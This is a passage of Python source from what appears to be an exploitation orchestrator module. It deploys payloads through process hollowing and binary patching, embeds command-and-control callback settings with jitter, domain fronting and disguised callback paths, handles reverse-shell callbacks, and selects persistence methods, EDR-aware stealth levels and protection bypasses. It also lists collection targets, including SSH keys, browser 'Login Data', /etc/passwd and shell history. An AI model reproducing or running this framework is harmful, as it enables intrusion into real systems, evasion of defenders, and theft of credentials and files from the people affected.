                "startup_delay": c2_config.get("startup_delay", 0),
                "hide_process": c2_config.get("hide_process", True)
            }

            # Use privilege escalation manager for local exploitation
            if self.privesc_manager:
                deployment_result = self.privesc_manager.execute_local_exploit(
                    binary_path=binary_path,
                    payload=payload,
                    technique=target_info.get("technique", "dll_hijacking"),
                    options=local_options
                )
                return deployment_result
            else:
                # Fallback local deployment via process injection
                import subprocess
                import tempfile

                # Write payload to temporary file
                with tempfile.NamedTemporaryFile(delete=False, suffix=".bin") as temp_file:
                    temp_file.write(payload)
                    temp_path = temp_file.name

                try:
                    # Apply startup delay from c2_config
                    if local_options["startup_delay"] > 0:
                        time.sleep(local_options["startup_delay"])

                    # Execute via subprocess with c2_config timeout
                    timeout = c2_config.get("execution_timeout", 30)
                    result = subprocess.run(
                        [binary_path], input=payload, capture_output=True, timeout=timeout)
                    os.unlink(temp_path)
                    return {"success": True, "method": "subprocess_injection", "exit_code": result.returncode}
                except Exception as e:
                    logger.error(
                        "Exception in exploitation_orchestrator: %s", e)
                    os.unlink(temp_path)
                    return {"success": False, "error": str(e)}

        except Exception as e:
            logger.error("Exception in exploitation_orchestrator: %s", e)
            return {"success": False, "error": str(e)}

    def _deploy_binary_payload(self, target_info: Dict[str, Any], payload: bytes, c2_config: Dict[str, Any]) -> Dict[str, Any]:
        """Deploy payload for binary analysis targets using C2 configuration."""
        try:
            # This handles cases where we're analyzing a binary for vulnerabilities
            # and injecting payloads for testing
            binary_path = target_info.get("binary_path")

            if self.payload_engine:
                # Configure deployment based on C2 settings
                deployment_options = {
                    "injection_point": target_info.get("injection_point", "entry_point"),
                    "encoding": c2_config.get("encryption_method", "xor"),
                    "obfuscation_level": "high" if c2_config.get("domain_fronting", False) else "medium",
                    "persistence": c2_config.get("persistence_enabled", True),
                    "anti_debug": c2_config.get("evasion_level") == "high",
                    "callback_urls": c2_config.get("callback_urls", []),
                    "beacon_interval": c2_config.get("beacon_interval", 30),
                    "jitter": c2_config.get("jitter", 0.3)
                }

                # If using proxy, embed proxy configuration
                if c2_config.get("proxy_settings", {}).get("use_proxy"):
                    deployment_options["proxy_config"] = {
                        "host": c2_config["proxy_settings"]["proxy_host"],
                        "port": c2_config["proxy_settings"]["proxy_port"],
                        "type": c2_config["proxy_settings"]["proxy_type"]
                    }

                # Apply timeout from C2 config
                deployment_options["timeout"] = c2_config.get(
                    "session_timeout", 300)

                deployment_result = self.payload_engine.inject_binary_payload(
                    target_binary=binary_path,
                    payload=payload,
                    injection_method=deployment_options.get(
                        "injection_point", "process_hollowing")
                )

                # If deployment successful, prepare binary for execution
                if deployment_result.get("success"):
                    # Configure binary execution based on C2 settings
                    execution_config = self._prepare_binary_execution(
                        deployment_result.get("output_path", binary_path),
                        c2_config
                    )
                    deployment_result["execution_config"] = execution_config

                return deployment_result
            else:
                # Fallback binary payload deployment with C2 configuration
                import tempfile

                # Create patched binary with embedded C2 config
                with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as tmp:
                    # Embed C2 configuration in payload
                    configured_payload = self._embed_c2_config(
                        payload, c2_config)
                    tmp.write(configured_payload)
                    patched_path = tmp.name

                return {
                    "success": True,
                    "method": "binary_patch",
                    "payload_size": len(configured_payload),
                    "output_path": patched_path,
                    "c2_endpoints": c2_config.get("callback_urls", [])
                }

        except Exception as e:
            logger.error("Exception in exploitation_orchestrator: %s", e)
            return {"success": False, "error": str(e)}

    def _prepare_binary_execution(self, binary_path: str, c2_config: Dict[str, Any]) -> Dict[str, Any]:
        """Prepare binary for execution with C2 configuration."""
        execution_config = {
            "path": binary_path,
            "environment": {},
            "arguments": []
        }

        # Set environment variables for C2 communication
        if c2_config.get("protocol") == "https":
            execution_config["environment"][
                "HTTPS_PROXY"] = f"{c2_config.get('interface', '127.0.0.1')}:{c2_config.get('port', 443)}"

        # Add user agent to environment
        if c2_config.get("user_agent"):
            execution_config["environment"]["HTTP_USER_AGENT"] = c2_config["user_agent"]

        # Configure execution delay based on beacon interval
        if c2_config.get("beacon_interval", 0) > 0:
            execution_config["startup_delay"] = c2_config["beacon_interval"]

        return execution_config

    def _embed_c2_config(self, payload: bytes, c2_config: Dict[str, Any]) -> bytes:
        """Embed C2 configuration into payload."""
        import json
        import struct

        # Create configuration block
        config_data = {
            "endpoints": c2_config.get("callback_urls", []),
            "protocol": c2_config.get("protocol", "tcp"),
            "port": c2_config.get("port", 4444),
            "encryption": c2_config.get("encryption_method", "xor"),
            "beacon_interval": c2_config.get("beacon_interval", 30),
            "jitter": c2_config.get("jitter", 0.3)
        }

        # Serialize configuration
        config_json = json.dumps(config_data).encode()
        config_size = len(config_json)

        # Create new payload with embedded config
        # Format: [original_payload][config_size:4 bytes][config_data][magic:4 bytes]
        magic = b"\xDE\xAD\xBE\xEF"

        configured_payload = (
            payload +
            struct.pack("<I", config_size) +
            config_json +
            magic
        )

        return configured_payload

    def _wait_for_c2_callback(self, c2_config: Dict[str, Any], timeout: int = 30) -> Dict[str, Any]:
        """Wait for C2 callback from deployed payload."""
        try:
            if self.c2_manager:
                # Use real C2 manager to wait for callback
                callback_result = self.c2_manager.wait_for_callback(
                    timeout=timeout
                )
                return callback_result
            else:
                # Fallback callback simulation
                import socket

                # Listen for incoming connections
                listen_port = c2_config.get("listen_port", 4444)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(timeout)

                try:
                    # Bind to localhost by default for security
                    bind_address = os.environ.get("EXPLOIT_BIND_ADDRESS", "127.0.0.1")
                    sock.bind((bind_address, listen_port))
                    sock.listen(1)

                    conn, addr = sock.accept()
                    return {
                        "success": True,
                        "connection_info": {
                            "source_ip": addr[0],
                            "source_port": addr[1],
                            "connection": conn
                        }
                    }
                except socket.timeout as e:
                    logger.error(
                        "socket.timeout in exploitation_orchestrator: %s", e)
                    return {"success": False, "error": "Callback timeout"}
                finally:
                    sock.close()

        except Exception as e:
            logger.error("Exception in exploitation_orchestrator: %s", e)
            return {"success": False, "error": str(e)}

    def _establish_session(self, connection_info: Dict[str, Any]) -> Dict[str, Any]:
        """Establish exploitation session from C2 callback."""
        try:
            if self.c2_manager:
                # Use real C2 session management
                payload_info = {
                    "type": connection_info.get("payload_type", "reverse_shell"),
                    "platform": connection_info.get("platform", "windows"),
                    "architecture": connection_info.get("arch", "x64")
                }
                session_result = self.c2_manager.establish_session(
                    connection_info, payload_info)
                return session_result
            else:
                # Fallback session establishment
                import uuid

                session_id = str(uuid.uuid4())
                return {
                    "success": True,
                    "session": {
                        "id": session_id,
                        "connection": connection_info.get("connection"),
                        "source_ip": connection_info.get("source_ip"),
                        "established_time": time.time()
                    }
                }

        except Exception as e:
            logger.error("Exception in exploitation_orchestrator: %s", e)
            return {"success": False, "error": str(e)}

    def _verify_access(self, session: Dict[str, Any]) -> Dict[str, Any]:
        """Verify successful access and gather system information."""
        try:
            connection = session.get("connection")

            if connection:
                # Send system information gathering commands
                commands = [
                    "whoami",
                    "hostname",
                    "uname -a" if "linux" in session.get(
                        "platform", "").lower() else "systeminfo"
                ]

                verification_data = {}

                for cmd in commands:
                    try:
                        # Send command and read response
                        connection.send(f"{cmd}\n".encode())
                        response = connection.recv(1024).decode().strip()

                        if cmd == "whoami":
                            verification_data["username"] = response
                            verification_data["privileges"] = "admin" if "admin" in response.lower(
                            ) or "root" in response.lower() else "user"
                        elif cmd == "hostname":
                            verification_data["hostname"] = response
                        else:
                            verification_data["system_info"] = response

                    except Exception as e:
                        logger.error(
                            "Exception in exploitation_orchestrator: %s", e)
                        continue

                # Extract additional information
                if "system_info" in verification_data:
                    system_info = verification_data["system_info"].lower()
                    if "windows" in system_info:
                        verification_data["platform"] = "windows"
                    elif "linux" in system_info:
                        verification_data["platform"] = "linux"

                    if "x86_64" in system_info or "amd64" in system_info:
                        verification_data["architecture"] = "x64"
                    else:
                        verification_data["architecture"] = "x86"

                return {"success": True, **verification_data}
            else:
                # No direct connection - assume verification based on callback
                return {
                    "success": True,
                    "username": "unknown",
                    "privileges": "user",
                    "platform": "unknown",
                    "architecture": "unknown"
                }

        except Exception as e:
            logger.error("Exception in exploitation_orchestrator: %s", e)
            return {"success": False, "error": str(e)}

    def _extract_bad_chars(self, intelligence_results: Dict[str, Any]) -> List[int]:
        """Extract bad characters from intelligence results."""
        bad_chars = [0x00]  # Null byte is always bad

        # Check for specific protections that add bad chars
        protections = intelligence_results.get(
            "results", {}).get("protections", [])
        if "string_filters" in str(protections).lower():
            bad_chars.extend([0x0a, 0x0d])  # newline and carriage return

        # Check vulnerability analysis for bad char info
        vulns = intelligence_results.get("results", {}).get(
            "analysis_results", {}).get("initial", {}).get("vulnerabilities", [])
        for vuln in vulns:
            if "bad_chars" in vuln:
                bad_chars.extend(vuln["bad_chars"])

        return list(set(bad_chars))

    def _determine_bypass_techniques(self, intelligence_results: Dict[str, Any]) -> List[str]:
        """Determine bypass techniques based on detected protections."""
        techniques = []
        protections = intelligence_results.get(
            "results", {}).get("protections", [])
        protection_str = str(protections).lower()

        if "aslr" in protection_str:
            techniques.append("aslr_bypass")
        if "dep" in protection_str or "nx" in protection_str:
            techniques.append("dep_bypass")
        if "cet" in protection_str:
            techniques.append("cet_bypass")
        if "stack_canary" in protection_str or "stack_guard" in protection_str:
            techniques.append("stack_canary_bypass")
        if "sandbox" in protection_str:
            techniques.append("sandbox_escape")

        return techniques

    def _select_exploit_method(self, vulnerabilities: List[Dict[str, Any]]) -> str:
        """Select optimal exploit method based on vulnerabilities."""
        # Priority order for exploit methods
        exploit_priority = {
            "buffer_overflow": 1,
            "command_injection": 2,
            "dll_hijacking": 3,
            "format_string": 4,
            "use_after_free": 5,
            "integer_overflow": 6
        }

        best_method = "generic"
        best_priority = 999

        for vuln in vulnerabilities:
            vuln_type = vuln.get("type", "").lower()
            for method, priority in exploit_priority.items():
                if method in vuln_type and priority < best_priority:
                    best_method = method
                    best_priority = priority

        return best_method

    def _check_protection(self, intelligence_results: Dict[str, Any], protection_type: str) -> bool:
        """Check if specific protection is enabled."""
        protections = intelligence_results.get(
            "results", {}).get("protections", [])
        protection_str = str(protections).lower()

        protection_map = {
            "aslr": ["aslr", "address space layout randomization"],
            "dep": ["dep", "nx", "no-execute", "data execution prevention"],
            "cet": ["cet", "control flow", "control enforcement"]
        }

        for keyword in protection_map.get(protection_type, []):
            if keyword in protection_str:
                return True

        return False

    def _select_c2_protocol(self, target_info: Dict[str, Any], evasion_level: str) -> str:
        """Select C2 protocol based on target environment."""
        # Check target environment
        environment = target_info.get("environment", {})
        network_restrictions = environment.get("network_restrictions", [])

        # High evasion always uses HTTPS
        if evasion_level == "high":
            return "https"

        # Check for protocol restrictions
        if "block_tcp" in network_restrictions:
            return "https"
        elif "allow_only_http" in network_restrictions:
            return "http"
        elif "corporate_proxy" in network_restrictions:
            return "https"  # HTTPS works better through proxies

        # Default based on evasion level
        return "https" if evasion_level == "medium" else "tcp"

    def _select_c2_port(self, target_info: Dict[str, Any], payload_config: Dict[str, Any]) -> int:
        """Select C2 port based on firewall rules."""
        environment = target_info.get("environment", {})
        allowed_ports = environment.get("allowed_outbound_ports", [])

        # If specific ports are allowed, use them
        if allowed_ports:
            # Prefer common ports
            common_ports = [443, 80, 8080, 8443]
            for port in common_ports:
                if port in allowed_ports:
                    return port
            # Use first allowed port
            return allowed_ports[0]

        # Check protocol and use appropriate default
        protocol = target_info.get("protocol", "tcp")
        if protocol == "https":
            return 443
        elif protocol == "http":
            return 80
        else:
            return payload_config.get("lport", 4444)

    def _select_c2_interface(self, target_info: Dict[str, Any]) -> str:
        """Select network interface for C2 server."""
        network_config = target_info.get("network_config", {})

        # Check if specific interface is required
        if "bind_interface" in network_config:
            return network_config["bind_interface"]

        # Check if we need to bind to specific IP
        if "c2_bind_ip" in network_config:
            return network_config["c2_bind_ip"]

        # Default to localhost for security
        # Only bind to all interfaces if explicitly configured
        return os.environ.get("EXPLOIT_C2_INTERFACE", "127.0.0.1")

    def _select_encryption_method(self, target_info: Dict[str, Any], evasion_level: str) -> str:
        """Select encryption method based on target and evasion needs."""
        # Check target capabilities
        capabilities = target_info.get("capabilities", {})

        if evasion_level == "high":
            # Use strongest encryption available
            if capabilities.get("supports_aes256", True):
                return "aes256"
            else:
                return "chacha20"
        elif evasion_level == "medium":
            return "aes128"
        else:
            # Low evasion - use fast encryption
            return "xor"

    def _calculate_max_sessions(self, target_info: Dict[str, Any]) -> int:
        """Calculate maximum concurrent sessions based on target."""
        environment = target_info.get("environment", {})

        # Scale based on environment type
        env_type = environment.get("type", "unknown")
        if env_type == "enterprise":
            return 100  # Large environment
        elif env_type == "small_business":
            return 50
        elif env_type == "home":
            return 10
        else:
            return 50  # Default

    def _calculate_session_timeout(self, target_info: Dict[str, Any]) -> int:
        """Calculate session timeout based on target environment."""
        environment = target_info.get("environment", {})

        # Check for session monitoring
        if environment.get("session_monitoring", False):
            return 120  # 2 minutes - short timeout
        elif environment.get("type") == "enterprise":
            return 300  # 5 minutes - moderate
        else:
            return 600  # 10 minutes - relaxed

    def _calculate_beacon_interval(self, target_info: Dict[str, Any], evasion_level: str) -> int:
        """Calculate beacon interval for callbacks."""
        environment = target_info.get("environment", {})

        # High evasion = longer intervals
        if evasion_level == "high":
            base_interval = 60  # 1 minute
        elif evasion_level == "medium":
            base_interval = 30  # 30 seconds
        else:
            base_interval = 10  # 10 seconds

        # Adjust based on monitoring
        if environment.get("ids_present", False):
            base_interval *= 2

        return base_interval

    def _calculate_jitter(self, evasion_level: str) -> float:
        """Calculate jitter percentage for beacon randomization."""
        jitter_map = {
            "high": 0.5,    # 50% jitter
            "medium": 0.3,  # 30% jitter
            "low": 0.1      # 10% jitter
        }
        return jitter_map.get(evasion_level, 0.3)

    def _should_use_domain_fronting(self, target_info: Dict[str, Any], evasion_level: str) -> bool:
        """Determine if domain fronting should be used."""
        if evasion_level != "high":
            return False

        environment = target_info.get("environment", {})
        # Use domain fronting in restrictive environments
        return environment.get("type") == "enterprise" or environment.get("strict_filtering", False)

    def _get_proxy_settings(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Get proxy settings from target environment."""
        environment = target_info.get("environment", {})
        proxy_config = environment.get("proxy_config", {})

        if not proxy_config:
            return {}

        return {
            "use_proxy": True,
            "proxy_host": proxy_config.get("host", ""),
            "proxy_port": proxy_config.get("port", 8080),
            "proxy_type": proxy_config.get("type", "http"),
            "proxy_auth": proxy_config.get("requires_auth", False)
        }

    def _generate_user_agent(self, target_info: Dict[str, Any]) -> str:
        """Generate appropriate user agent string."""
        environment = target_info.get("environment", {})

        # Match environment's common user agents
        if environment.get("type") == "enterprise":
            return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        elif environment.get("type") == "mobile":
            return "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
        else:
            return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124"

    def _generate_callback_urls(self, target_info: Dict[str, Any], protocol: str, port: int) -> List[str]:
        """Generate callback URLs for C2 communication."""
        urls = []

        # Get C2 domains or IPs
        c2_hosts = target_info.get("c2_hosts", ["127.0.0.1"])

        for host in c2_hosts:
            base_url = f"{protocol}://{host}:{port}"

            # Add multiple callback paths for resilience
            paths = ["/api/v1/callback", "/update/check",
                     "/sync/data", "/health/status"]
            for path in paths:
                urls.append(base_url + path)

        return urls

    def _determine_payload_path(self, target_info: Dict[str, Any], platform: str) -> str:
        """Determine appropriate payload path based on target using secure temporary files."""
        import os
        import tempfile

        environment = target_info.get("environment", {})

        # Create secure temporary file with proper permissions
        if platform.lower() == "windows":
            # Use Windows temp directory with secure file creation
            temp_dir = os.environ.get("TEMP", tempfile.gettempdir())
            if environment.get("type") == "enterprise":
                # Create in a more appropriate directory for enterprise
                temp_dir = os.path.join(os.environ.get("PROGRAMDATA", os.path.join(os.environ.get("SystemDrive", "C:"), "ProgramData")),
                                        "Microsoft", "Windows", "AppCache")
                os.makedirs(temp_dir, exist_ok=True)

            # Create secure temporary file with restricted permissions
            fd, temp_path = tempfile.mkstemp(suffix=".dat", prefix="cache_", dir=temp_dir)
            os.close(fd)  # Close the file descriptor

            # Set restrictive permissions on Windows
            import stat
            os.chmod(temp_path, stat.S_IRUSR | stat.S_IWUSR)

        elif platform.lower() == "linux":
            # Use appropriate temp directory based on environment
            if environment.get("type") == "server":
                # For servers, use system temp directory with secure subdirectory
                base_dir = tempfile.gettempdir()
                temp_subdir = tempfile.mkdtemp(prefix=".cache_", dir=base_dir)
                os.chmod(temp_subdir, 0o700)  # Owner only permissions

                fd, temp_path = tempfile.mkstemp(suffix="", prefix="data_", dir=temp_subdir)
                os.close(fd)
            else:
                # For regular systems, use user's temp directory
                temp_dir = os.environ.get("TMPDIR", tempfile.gettempdir())
                user_temp = os.path.join(temp_dir, f"user_{os.getuid()}")
                os.makedirs(user_temp, mode=0o700, exist_ok=True)

                fd, temp_path = tempfile.mkstemp(suffix="", prefix=".data_", dir=user_temp)
                os.close(fd)

            # Ensure restrictive permissions
            os.chmod(temp_path, 0o600)  # Owner read/write only

        else:
            # For other platforms, use secure temp file in user directory
            user_temp = os.path.expanduser("~/.cache/intellicrack")
            os.makedirs(user_temp, mode=0o700, exist_ok=True)

            fd, temp_path = tempfile.mkstemp(suffix="", prefix="data_", dir=user_temp)
            os.close(fd)
            os.chmod(temp_path, 0o600)

        # Store the temp path for cleanup later
        if not hasattr(self, "_temp_files"):
            self._temp_files = []
        self._temp_files.append(temp_path)

        return temp_path

    def cleanup(self):
        """Clean up temporary files created during exploitation."""
        if hasattr(self, "_temp_files"):
            for temp_file in self._temp_files:
                try:
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
                        logger.debug(f"Removed temporary file: {temp_file}")

                    # Also try to remove parent directory if it's a temp directory we created
                    parent_dir = os.path.dirname(temp_file)
                    if (parent_dir and
                        os.path.exists(parent_dir) and
                        not os.listdir(parent_dir) and
                        (".cache_" in parent_dir or "user_" in parent_dir)):
                        os.rmdir(parent_dir)
                        logger.debug(f"Removed temporary directory: {parent_dir}")
                except Exception as e:
                    logger.warning(f"Failed to clean up temp file {temp_file}: {e}")

            self._temp_files.clear()

    def __del__(self):
        """Destructor to ensure cleanup on object destruction."""
        self.cleanup()

    def _determine_stealth_level(self, target_info: Dict[str, Any], environment: Dict[str, Any]) -> str:
        """Determine stealth level based on environment and target characteristics."""
        base_stealth = "low"

        # Check for security monitoring in environment
        if environment.get("edr_present", False):
            base_stealth = "high"
        elif environment.get("antivirus_present", False):
            base_stealth = "medium"
        elif environment.get("type") == "enterprise":
            base_stealth = "medium"

        # Adjust stealth level based on target characteristics
        binary_info = target_info.get("binary_info", {})
        platform = target_info.get("platform", "unknown")

        # High-profile targets require more stealth
        if platform == "windows" and binary_info.get("type") == "service":
            # System services are more monitored
            if base_stealth == "low":
                base_stealth = "medium"
            elif base_stealth == "medium":
                base_stealth = "high"

        # Large binaries often indicate important applications
        binary_size = binary_info.get("size", 0)
        if binary_size > 50 * 1024 * 1024:  # >50MB suggests major application
            if base_stealth == "low":
                base_stealth = "medium"

        # Check if target is in a sensitive location
        binary_path = target_info.get("binary_path", "")
        if any(sensitive in binary_path.lower() for sensitive in ["system32", "program files", "windows"]):
            if base_stealth != "high":
                base_stealth = "high"

        self.logger.info(
            f"Determined stealth level: {base_stealth} (platform: {platform}, size: {binary_size}, path: {binary_path})")
        return base_stealth

    def _select_persistence_methods(self, target_info: Dict[str, Any], platform: str) -> List[str]:
        """Select persistence methods based on target."""
        methods = []
        environment = target_info.get("environment", {})

        if platform.lower() == "windows":
            if environment.get("type") != "enterprise":
                methods.append("registry_run")
            methods.append("scheduled_task")
            if target_info.get("has_wmi_access", False):
                methods.append("wmi_event")
        elif platform.lower() == "linux":
            methods.append("cron")
            if environment.get("init_system") == "systemd":
                methods.append("systemd_service")
            methods.append("rc_local")

        return methods

    def _select_escalation_technique(self, target_info: Dict[str, Any], platform: str) -> str:
        """Select privilege escalation technique based on target."""
        # Check for known vulnerabilities
        vulnerabilities = target_info.get("vulnerabilities", [])

        for vuln in vulnerabilities:
            if "kernel" in vuln.get("component", "").lower():
                return "kernel_exploit"
            elif "service" in vuln.get("component", "").lower():
                return "service_exploit"

        # Default techniques by platform
        if platform.lower() == "windows":
            return "token_manipulation"
        else:
            return "sudo_exploit"

    def _get_escalation_options(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Get privilege escalation options from target info."""
        return {
            "target_version": target_info.get("os_version", ""),
            "architecture": target_info.get("architecture", "x64"),
            "vulnerable_services": target_info.get("vulnerable_services", []),
            "writable_paths": target_info.get("writable_paths", [])
        }

    def _determine_collection_targets(self, target_info: Dict[str, Any],
                                      environment: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Determine what data to collect based on target."""
        targets = []
        platform = target_info.get("platform", "unknown").lower()
        app_type = target_info.get("application_type", "")

        # Use environment to customize collection based on detected context
        env_type = environment.get("type", "unknown")
        has_network = environment.get("network_access", True)

        # Adjust targets based on environment constraints
        if not has_network:
            logger.debug(
                "Limited network access detected, focusing on local collection")
        if env_type in ["sandbox", "vm"]:
            logger.debug(
                f"Detected {env_type} environment, adjusting collection strategy")

        # Common targets
        if platform == "windows":
            targets.extend([
                {"type": "file", "path": "C:\\Users\\*\\Documents\\*.doc*"},
                {"type": "registry",
                    "key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
                {"type": "file", "path": "C:\\Users\\*\\AppData\\Roaming\\*\\Login Data"}
            ])
        elif platform == "linux":
            targets.extend([
                {"type": "file", "path": "/home/*/.ssh/*"},
                {"type": "file", "path": "/etc/passwd"},
                {"type": "file", "path": "/home/*/.bash_history"}
            ])

        # Application-specific targets
        if "database" in app_type:
            targets.append({"type": "file", "path": "*.sql"})
        elif "web" in app_type:
            targets.append({"type": "file", "path": "*config*.php"})

        return targets

    def _collect_file_data(self, path: str, session_info: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Collect file data through session."""
        try:
            # Use session_info to determine collection method
            session_type = session_info.get("type", "unknown")
            session_id = session_info.get("id", "unknown")

            logger.debug(
                f"Collecting file {path} via {session_type} session {session_id}")

            # In real implementation, would use session to read file
            return {
                "type": "file",
                "path": path,
                "size": 0,
                "collected": True,
                "session_id": session_id
            }
        except Exception as e:
            self.logger.error("Exception in exploitation_orchestrator: %s", e)
            return None

    def _collect_registry_data(self, key: str, session_info: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Collect registry data through session."""
        try:
            # Use session_info to determine collection method
            session_type = session_info.get("type", "unknown")
            session_id = session_info.get("id", "unknown")

            logger.debug(
                f"Collecting registry key {key} via {session_type} session {session_id}")

            # In real implementation, would use session to read registry
            return {
                "type": "registry",
                "key": key,
                "values": {},
                "collected": True,
                "session_id": session_id
            }
        except Exception as e:
            self.logger.error("Exception in exploitation_orchestrator: %s", e)
            return None

    def _collect_memory_data(self, process: str, session_info: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Collect memory data through session."""
        try:
            # Use session_info to determine collection method
            session_type = session_info.get("type", "unknown")
            session_id = session_info.get("id", "unknown")

            logger.debug(
                f"Collecting memory from {process} via {session_type} session {session_id}")

            # In real implementation, would use session to dump memory
            return {
                "type": "memory",
                "process": process,
                "size": 0,
                "collected": True,
                "session_id": session_id
            }
        except Exception as e:
            self.logger.error("Exception in exploitation_orchestrator: %s", e)
            return None
